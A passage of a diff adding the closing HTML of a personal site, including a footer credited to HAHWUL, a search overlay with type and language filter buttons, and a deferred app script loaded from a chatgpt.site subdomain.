1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"
+                        /></svg
+                ></a>
+            </div>
+            <p>Developed and Designed by Me<br />2026 HAHWUL.</p>
+        </div>
+    </div>
+</footer>
+        <div
+    class="search-overlay"
+    data-search-overlay
+    data-search-index="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/search_index.json"
+    data-search-empty="Type to search posts, notes, projects and the archive."
+    data-search-no-results="No results found."
+    data-search-loading="Loading index"
+    data-search-error="Unable to load search index. Refresh and try again."
+    aria-hidden="true"
+>
+    <div class="search-panel" role="dialog" aria-modal="true" aria-label="Search">
+        <div class="search-header">
+            <div class="search-input-wrapper">
+                <input
+                    type="search"
+                    name="search"
+                    placeholder="Search the site, #tag to filter"
+                    aria-label="Search the site"
+                    autocomplete="off"
+                    spellcheck="false"
+                    data-search-input
+                >
+            </div>
+            <div class="search-meta">
+                <span class="search-shortcut" data-search-key>⌘K</span>
+                <button class="search-close" type="button" data-search-close aria-label="Close search">
+                    Esc
+                </button>
+            </div>
+        </div>
+        <div class="search-filters" data-search-filters>
+            <div class="search-filter-group" role="group" aria-label="Filter by type" data-filter-group="type">
+                <button type="button" class="search-chip is-active" data-filter-type="all" aria-pressed="true">All<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="post" aria-pressed="false">Posts<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="note" aria-pressed="false">Notes<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="project" aria-pressed="false">Projects<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="archive" aria-pressed="false">Archive<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="page" aria-pressed="false">Pages<span class="search-chip-count" data-chip-count></span></button>
+            </div>
+            <div class="search-filter-group search-filter-group--lang" role="group" aria-label="Filter by language" data-filter-group="lang">
+                <button type="button" class="search-chip is-active" data-filter-lang="all" aria-pressed="true">All</button>
+                <button type="button" class="search-chip" data-filter-lang="en" aria-pressed="false">EN</button>
+                <button type="button" class="search-chip" data-filter-lang="ko" aria-pressed="false">KO</button>
+            </div>
+        </div>
+        <div class="search-status" data-search-status></div>
+        <div class="search-results" data-search-results aria-live="polite">
+            <p class="search-empty" data-search-empty>Type to search posts, notes, projects and the archive.</p>
+        </div>
+    </div>
+</div>
+    </div>
+
+    
+    
+
+    
+    <script src="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/assets/app.1881a2e0.js" defer></script>
+</body>
+
+</html>
